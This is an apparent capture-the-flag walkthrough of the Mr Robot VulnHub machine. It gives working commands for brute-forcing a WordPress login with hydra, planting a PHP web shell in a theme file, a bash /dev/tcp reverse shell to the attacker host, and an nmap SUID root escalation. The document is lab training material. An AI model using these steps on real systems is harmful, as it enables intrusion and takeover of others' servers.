# 🛡️ Mr Robot VulnHub — Complete Walkthrough (Commands Used)

> - Environment
> - Attacker: Kali Linux
> - Target: Mr Robot (VulnHub)
> - Network: Host-Only Adapter
> - Purpose: Educational / Lab-based penetration testing only

* 🔍 Phase 1 : Network Discovery
 - **1️⃣ Find target IP**
```
ip a
```
- This command is used to list all network interfaces and IP addresses on the attacker machine.
* 🔍 Phase 2 : Network Discovery
```
sudo netdiscover -i eth1 -r 194.168.x.x
```
- This command performs an ARP scan for network discovery using the eth1 interface.
It is used to identify live hosts and discover the target machine’s IP address.
# 🌐 Phase 3 : Port Scanning
```
nmap -sS -sV -p- 192.168.x.x 
```
- This command performs a TCP SYN scan on all ports of the target system.
It identifies open ports and detects the services and versions running on them.
-  **⚠️ DNS Warning Fix**
```
nmap -sS -sV -p- -n 192.168.x.x
```
- The -n option disables DNS resolution to avoid DNS-related warnings.
This makes the scan faster and more reliable in lab environments.
* 🌐 Phase 3 : Web Enumeration
* **robots.txt check**
```  
http://192.168.x.x/robots.txt
```

**📌 Output:**
-
![1_3olegJiczAZe014yYac-JQ](https://github.com/user-attachments/assets/70966e8c-9e90-4ac5-abce-e5f5d06e5d7c)
- **🏳️ Flag 1 Capture**
```
curl http://192.168.xx.x/key-1-of-3.txt
```
**✅ Flag-1:**

> 07x403c8a58a1xx0d943455fbx0x724b9

# 2️⃣ Download wordlist
```
wget http://192.168.xx.x/fsocity.dic
```
- This command downloads the fsocity.dic wordlist from the target web server.
The wordlist is later used for directory brute-forcing and password cracking.
```
sort fsocity.dic | uniq > clean.txt
```
- This command sorts the wordlist and removes duplicate entries.
A clean wordlist improves efficiency during brute-force attacks.
```
wc -l clean.txt
```
- This command counts the total number of unique entries in the cleaned wordlist.
It helps estimate the size and complexity of the wordlist before using it in attacks.
- 📌 Wordlist ready.

**🔐 Phase 4: WordPress Enumeration**
- FOR LOGIN PAGE:
```
hydra -L clean.txt -p test 192.168.xx.x http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^:Invalid password"
```
- This command uses Hydra to brute-force the WordPress login page.
It tests usernames from clean.txt with a fixed password (test) and identifies valid usernames based on the server’s response.

**⏹️ Stopping the Attack**

- Press Ctrl + C to stop the brute-force process once a valid username is found.
**Open in Browser**
```
http://192.168.194.7/wp-login.php
```
- This URL is used to directly access the WordPress login page of the target website.
It allows manual verification of valid usernames discovered during brute-force attacks.
**Alternative Method (Using Terminal)**
```
firefox http://192.168.194.7/wp-login.php &
```
- This command opens the WordPress login page in Firefox from the terminal.
It is useful when the login page is not easily discoverable through directory browsing.
📌 Valid username identified (manual + context):
```
elliot
```
📌 Valid password:
```
ER28-0652
```
🧑‍💻 Phase 5: WordPress RCE
- 1️⃣ Login to admin panel
```
http://192.168.194.7/wp-admin
```
- This step is used to access the WordPress admin dashboard using valid credentials.
Admin access allows modification of theme files, which can be leveraged for code execution.
- 2️⃣ Inject PHP Web Shell

Path:
> Appearance → Editor → 404.php
**Replace content with:**
```
<?php system($_GET['cmd']); ?>
```
- This PHP code injects a web shell into the theme’s 404.php file.
It allows execution of system commands through a URL parameter.
**Save file**
- 3️⃣ Confirm command execution
```
http://192.168.194.7/wp-content/themes/twentyfifteen/404.php?cmd=id
```
- This command confirms successful remote command execution on the target.
The output shows the current user context (daemon), verifying shell access.
📌 Output:

> uid=1(daemon) gid=1(daemon)
🐚 Phase 6: Reverse Shell (WORKING METHOD)
- 1️⃣ Start listener
```
nc -lvnp 4444
```
- This command starts a listener on the attacker machine to receive a reverse shell connection.
It waits for the target system to connect back.
- 2️⃣ Trigger reverse shell (URL-encoded bash/paste in browser)
```
http://192.168.194.7/wp-content/themes/twentyfifteen/404.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.194.5/4444+0%3E%261%27
```
 -This URL executes a bash reverse shell from the target to the attacker’s machine.
Once triggered, it provides an interactive shell over the Netcat listener.
📌 Shell obtained:
```
/wordpress/htdocs/wp-content/themes/twentyfifteen$
```
- This indicates a successful reverse shell on the target system.
The attacker now has command-line access as a low-privileged user within the WordPress environment.
- 3️⃣ Upgrade shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
- This command upgrades the basic reverse shell to a fully interactive TTY shell.
It improves usability by enabling proper command execution and shell features.
```whoami```
> daemon
- This command confirms the current user context.
The output shows the shell is running as the daemon user.
 🧑‍💻 Phase 7: User Escalation (robot)
- 1️⃣ Navigate to robot home
```
cd /home/robot
ls
```
- This step enumerates files in the robot user’s home directory.
Sensitive files related to credentials and flags are discovered here.
- 📌 Files:
```
password.raw-md5
key-2-of-3.txt
```
- The presence of an MD5 hash file suggests password cracking as the next step.
key-2-of-3.txt indicates a user-level flag.
- 2️⃣ Read hash
```
cat password.raw-md5
```
- This command displays the stored MD5 password hash for the robot user.
The hash is later cracked to obtain the plaintext password.
- 📌 Hash:
> c3fcd3d76192e4007dfb496cca67e13b
> - This is a weak MD5 hash that can be cracked using common wordlists or analysis.
- 📌 Intended password (weak MD5):
> abcdefghijklmnopqrstuvwxyz
- The password is extremely weak, making MD5 cracking trivial.
This allows escalation from the daemon user to the robot user.
- 3️⃣ Switch user
```
su roobot
```
- This command is used to switch from the low-privileged daemon user to the robot user.
The previously cracked password is used for authentication.

**Password:**
> abcdefghijklmnopqrstuvwxyz
- The weak password successfully authenticates the robot user.
* Check:
```whoami```
- This command confirms the current user context.
The output shows the session is now running as robot.
- 📌 Output:
```robot```
🏳️ Flag 2 Capture
```
cat key-2-of-3.txt
```
- This command reads the second flag stored in the robot user’s home directory.
Capturing this file confirms successful user-level privilege escalation.
- ✅ Flag-2:

> 822xx395618xf6x4xx5edexeb3xf959
👑 Phase 8: Root Privilege Escalation
- 1️⃣ Find SUID binaries
```
find / -perm -4000 2>/dev/null
```
- This command searches for files with the SUID permission set.
SUID binaries can allow privilege escalation if they are misconfigured or vulnerable.
- 📌 Vulnerable binary:
```
/usr/bin/nmap
```
- The presence of nmap with SUID permissions indicates a known privilege escalation vector.
- 2️⃣ Exploit SUID nmap
```
nmap --interactive
```
- This command starts Nmap in interactive mode, which allows executing internal Nmap commands and shell escapes.
```
!sh
```
- This command is executed inside Nmap interactive mode to spawn a system shell.
Since nmap is running with SUID root privileges, the spawned shell inherits root access, leading to full privilege escalation.
- 3️⃣ Root confirmation
``` whoami```
- This command verifies the current user.
The output confirms root-level access.
📌 Output:
> root
- 🏁 Phase 9: Final Flag
```
cd /root
```
- This moves to the root user’s home directory, which is accessible only with root privileges.
```
cat key-3-of-3.txt
```
- This command reads the final flag, confirming successful root compromise.
- ✅ Flag-3:

04787ddef27c3dxe1ee1x1x216x0x4e4
